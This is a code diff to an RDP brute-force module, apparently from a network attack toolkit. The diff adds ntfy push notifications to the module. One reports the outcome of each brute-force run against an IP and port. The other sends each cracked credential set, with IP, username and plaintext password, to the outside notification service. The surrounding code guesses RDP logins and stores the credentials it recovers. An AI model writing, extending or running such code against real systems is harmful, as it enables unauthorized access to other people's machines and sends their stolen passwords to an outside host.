@@ -13,6 +13,9 @@ from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from queue import Queue
 from shared import SharedData
 from logger import Logger
+from ntfy import send_ntfy
+
+
 
 # Configure the logger
 logger = Logger(name="rdp_connector.py", level=logging.DEBUG)
@@ -47,6 +50,10 @@ class RDPBruteforce:
         logger.info(f"Executing RDPBruteforce on {ip}:{port}...")
         self.shared_data.bjornorch_status = "RDPBruteforce"
         success, results = self.bruteforce_rdp(ip, port)
+        status = "success" if success else "failed"
+        message = f"RDP Brute Force on {ip}:{port} resulted in {status}"
+        send_ntfy(message=message)
+
         return 'success' if success else 'failed'
 
 class RDPConnector:
@@ -114,6 +121,8 @@ class RDPConnector:
                 with self.lock:
                     self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                     logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}")
+                    message = f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password} (RDP BRUTEFORCE)"
+                    self.shared_data.run_action("send_info_to_ntfy", message=message)
                     self.save_results()
                     self.removeduplicates()
                     success_flag[0] = True
